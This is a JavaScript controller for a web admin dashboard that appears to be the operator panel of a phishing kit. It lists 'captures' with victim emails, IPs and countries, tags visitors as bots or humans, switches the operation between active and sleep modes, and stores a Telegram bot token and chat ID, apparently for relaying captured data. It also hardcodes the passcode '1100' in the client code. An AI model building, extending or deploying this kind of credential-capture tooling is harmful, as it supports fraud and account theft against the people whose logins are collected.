// ====== ADMIN DASHBOARD CONTROLLER ======
(function() {
    'use strict';

    // ====== CONFIG ======
    const CONFIG = {
        PASSCODE: '1100',
        REFRESH_INTERVAL: 10000,
        API_BASE: '/api'
    };

    // ====== STATE ======
    let refreshTimer = null;
    let dataCache = null;

    // ====== DOM REFS ======
    const DOM = {};

    function cacheDom() {
        DOM.headerTime = document.getElementById('headerTime');
        DOM.statVisitors = document.getElementById('statVisitors');
        DOM.statBots = document.getElementById('statBots');
        DOM.statCaptures = document.getElementById('statCaptures');
        DOM.statUnique = document.getElementById('statUnique');
        DOM.statTelegram = document.getElementById('statTelegram');
        DOM.statTelegramStatus = document.getElementById('statTelegramStatus');
        DOM.statMode = document.getElementById('statMode');
        DOM.configStatus = document.getElementById('configStatus');
        DOM.capturesBody = document.getElementById('capturesBody');
        DOM.capturesCount = document.getElementById('capturesCount');
        DOM.visitorsBody = document.getElementById('visitorsBody');
        DOM.visitorsCount = document.getElementById('visitorsCount');
        DOM.activityBody = document.getElementById('activityBody');
        DOM.telegramToken = document.getElementById('telegramToken');
        DOM.chatId = document.getElementById('chatId');
        DOM.passcode = document.getElementById('passcode');
        DOM.modeValue = document.getElementById('modeValue');
        DOM.modeActive = document.getElementById('modeActive');
        DOM.modeSleep = document.getElementById('modeSleep');
        DOM.statusMessage = document.getElementById('statusMessage');
        DOM.telegramTestResult = document.getElementById('telegramTestResult');
        DOM.adminForm = document.getElementById('adminForm');
    }

    // ====== UTILITIES ======
    function formatTime(iso) {
        if (!iso) return 'N/A';
        try {
            const d = new Date(iso);
            return d.toLocaleTimeString('en-US', {
                hour12: false,
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        } catch {
            return 'Invalid';
        }
    }

    function formatDate(iso) {
        if (!iso) return 'N/A';
        try {
            const d = new Date(iso);
            return d.toLocaleString('en-US', {
                hour12: false,
                year: 'numeric',
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
        } catch {
            return 'Invalid';
        }
    }

    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function truncate(str, max) {
        if (!str) return '';
        return str.length > max ? str.substring(0, max) + '...' : str;
    }

    // ====== UI HELPERS ======
    function showStatus(msg, type) {
        const el = DOM.statusMessage;
        el.style.display = 'block';
        el.textContent = msg;
        const colors = {
            success: { bg: '#0a2a1a', color: '#00b894', border: '#00b894' },
            error: { bg: '#2a1a0a', color: '#e17055', border: '#e17055' },
            info: { bg: '#0a1a2a', color: '#64b5f6', border: '#64b5f6' },
            warning: { bg: '#2a2a0a', color: '#fdcb6e', border: '#fdcb6e' }
        };
        const style = colors[type] || colors.info;
        el.style.background = style.bg;
        el.style.color = style.color;
        el.style.border = '1px solid ' + style.border;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => { el.style.display = 'none'; }, 4000);
    }

    function updateHeaderTime() {
        if (DOM.headerTime) {
            DOM.headerTime.textContent = new Date().toLocaleString('en-US', {
                hour12: false,
                year: 'numeric',
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }
    }

    // ====== MODE TOGGLE ======
    function initModeToggle() {
        if (DOM.modeActive) {
            DOM.modeActive.addEventListener('click', function() {
                DOM.modeValue.value = 'active';
                this.className = 'toggle-btn active';
                DOM.modeSleep.className = 'toggle-btn';
            });
        }
        if (DOM.modeSleep) {
            DOM.modeSleep.addEventListener('click', function() {
                DOM.modeValue.value = 'sleep';
                this.className = 'toggle-btn sleep';
                DOM.modeActive.className = 'toggle-btn';
            });
        }
    }

    // ====== RENDER FUNCTIONS ======
    function renderStats(data) {
        const stats = data.stats || {};
        DOM.statVisitors.textContent = stats.total_visitors || 0;
        DOM.statBots.textContent = stats.total_bots || 0;
        DOM.statCaptures.textContent = stats.total_captures || 0;
        DOM.statUnique.textContent = stats.unique_ips || 0;

        const mode = data.config?.mode || 'active';
        DOM.statMode.textContent = mode === 'active' ? '🟢 Active' : '🔴 Sleep';
        DOM.statMode.style.color = mode === 'active' ? '#00b894' : '#e17055';

        const tgConfigured = data.telegram?.configured || false;
        const tgStatus = data.telegram?.status || 'not_configured';

        if (tgConfigured && tgStatus === 'connected') {
            DOM.statTelegram.textContent = '✅';
            DOM.statTelegram.style.color = '#00b894';
            DOM.statTelegramStatus.textContent = 'Connected';
        } else if (tgConfigured) {
            DOM.statTelegram.textContent = '⚠️';
            DOM.statTelegram.style.color = '#fdcb6e';
            DOM.statTelegramStatus.textContent = tgStatus || 'Error';
        } else {
            DOM.statTelegram.textContent = '❌';
            DOM.statTelegram.style.color = '#e17055';
            DOM.statTelegramStatus.textContent = 'Not configured';
        }

        DOM.configStatus.textContent = stats.total_visitors > 0 ? '📊 Live' : 'Ready';
    }

    function renderCaptures(data) {
        const captures = data.logs?.captures || [];
        DOM.capturesCount.textContent = captures.length;

        if (captures.length === 0) {
            DOM.capturesBody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">No captures yet</td></tr>';
            return;
        }

        DOM.capturesBody.innerHTML = captures.map(c => `
            <tr>
                <td>${formatTime(c.timestamp)}</td>
                <td>${escapeHtml(c.type || 'Unknown')}</td>
                <td>${escapeHtml(truncate(c.email || 'N/A', 30))}</td>
                <td>${escapeHtml(c.ip || 'N/A')}</td>
                <td>${escapeHtml(c.country || 'Unknown')}</td>
            </tr>
        `).join('');
    }

    function renderVisitors(data) {
        const visitors = data.logs?.visitors || [];
        DOM.visitorsCount.textContent = visitors.length;

        if (visitors.length === 0) {
            DOM.visitorsBody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">No visitors yet</td></tr>';
            return;
        }

        DOM.visitorsBody.innerHTML = visitors.map(v => `
            <tr>
                <td>${formatTime(v.timestamp)}</td>
                <td>${escapeHtml(v.ip || 'N/A')}</td>
                <td>${escapeHtml(v.page || '/')}</td>
                <td>${escapeHtml(v.country || 'Unknown')}</td>
                <td><span class="${v.is_bot ? 'bot-tag' : 'human-tag'}">${v.is_bot ? '🤖 Bot' : '👤 Human'}</span></td>
            </tr>
        `).join('');
    }

    function renderActivity(data) {
        const activity = data.logs?.activity || [];
        
        if (activity.length === 0) {
            DOM.activityBody.innerHTML = '<div style="padding:6px 0;border-bottom:1px solid #0f0f1a;color:#6c6c8a;">Waiting for activity...</div>';
            return;
        }

        DOM.activityBody.innerHTML = activity.map(a => `
            <div style="padding:4px 0;border-bottom:1px solid #0f0f1a;display:flex;justify-content:space-between;align-items:center;">
                <span style="font-size:12px;">${escapeHtml(a.message || 'Action')}</span>
                <span style="color:#4a4a6a;font-size:11px;">${formatTime(a.time)}</span>
            </div>
        `).join('');
    }

    function renderForm(data) {
        const config = data.config || {};
        DOM.telegramToken.value = config.telegram_token || '';
        DOM.chatId.value = config.chat_id || '';
        
        const mode = config.mode || 'active';
        DOM.modeValue.value = mode;
        if (mode === 'sleep') {
            DOM.modeSleep.className = 'toggle-btn sleep';
            DOM.modeActive.className = 'toggle-btn';
        } else {
            DOM.modeActive.className = 'toggle-btn active';
            DOM.modeSleep.className = 'toggle-btn';
        }
    }

    // ====== MAIN LOAD FUNCTION ======
    async function loadData() {
        try {
            const response = await fetch('/api/admin', {
                headers: { 'X-Admin-Passcode': CONFIG.PASSCODE }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            const data = await response.json();
            
            if (data.status === 'success') {
                dataCache = data;
                renderStats(data);
                renderCaptures(data);
                renderVisitors(data);
                renderActivity(data);
                renderForm(data);
                return true;
            } else {
                throw new Error(data.message || 'Unknown error');
            }
        } catch (err) {
            console.error('Load data error:', err);
            showStatus('❌ Failed to load data: ' + err.message, 'error');
            return false;
        }
    }

    // ====== REFRESH ======
    function refreshData() {
        loadData();
        showStatus('🔄 Refreshed', 'info');
    }

    // ====== TEST TELEGRAM ======
    async function testTelegram() {
        const token = DOM.telegramToken.value;
        const chatId = DOM.chatId.value;
        const passcode = DOM.passcode.value;

        if (passcode !== CONFIG.PASSCODE) {
            DOM.telegramTestResult.textContent = '❌ Invalid passcode';
            DOM.telegramTestResult.style.color = '#e17055';
            return;
        }

        if (!token || !chatId) {
            DOM.telegramTestResult.textContent = '❌ Enter Token & Chat ID first';
            DOM.telegramTestResult.style.color = '#e17055';
            return;
        }

        try {
            const response = await fetch('/api/admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    passcode: passcode,
                    telegram_token: token,
                    chat_id: chatId,
                    mode: DOM.modeValue.value
                })
            });
            
            const data = await response.json();
            
            if (data.telegram_status === 'connected') {
                DOM.telegramTestResult.textContent = '✅ Telegram connected successfully!';
                DOM.telegramTestResult.style.color = '#00b894';
            } else {
                DOM.telegramTestResult.textContent = '⚠️ Status: ' + (data.telegram_status || 'Unknown');
                DOM.telegramTestResult.style.color = '#fdcb6e';
            }
            
            loadData();
        } catch (err) {
            DOM.telegramTestResult.textContent = '❌ Error: ' + err.message;
            DOM.telegramTestResult.style.color = '#e17055';
        }
    }

    // ====== CLEAR LOGS ======
    function clearLogs() {
        if (confirm('⚠️ Clear all logs permanently?')) {
            DOM.visitorsBody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">Cleared</td></tr>';
            DOM.capturesBody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">Cleared</td></tr>';
            DOM.activityBody.innerHTML = '<div style="padding:6px 0;border-bottom:1px solid #0f0f1a;color:#6c6c8a;">Logs cleared</div>';
            showStatus('🗑️ Logs cleared', 'info');
        }
    }

    // ====== FORM SUBMIT ======
    function initFormSubmit() {
        DOM.adminForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const passcode = DOM.passcode.value;
            const token = DOM.telegramToken.value;
            const chatId = DOM.chatId.value;
            const mode = DOM.modeValue.value;

            if (passcode !== CONFIG.PASSCODE) {
                showStatus('❌ Invalid passcode', 'error');
                return;
            }

            try {
                const response = await fetch('/api/admin', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        passcode: passcode,
                        telegram_token: token,
                        chat_id: chatId,
                        mode: mode
                    })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    const tgStatus = data.telegram_status === 'connected' ? '✅ Connected' : '⚠️ ' + data.telegram_status;
                    showStatus('✅ Saved! Telegram: ' + tgStatus, 'success');
                    loadData();
                } else {
                    showStatus('❌ Error: ' + data.message, 'error');
                }
            } catch (err) {
                showStatus('❌ Network error: ' + err.message, 'error');
            }
        });
    }

    // ====== EXPOSE GLOBALLY ======
    window.refreshData = refreshData;
    window.testTelegram = testTelegram;
    window.clearLogs = clearLogs;

    // ====== INIT ======
    function init() {
        cacheDom();
        initModeToggle();
        initFormSubmit();
        
        updateHeaderTime();
        setInterval(updateHeaderTime, 1000);
        
        loadData();
        
        if (refreshTimer) clearInterval(refreshTimer);
        refreshTimer = setInterval(loadData, CONFIG.REFRESH_INTERVAL);
        
        console.log('⚡ Admin Dashboard 2026 initialized');
    }

    // ====== START ======
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();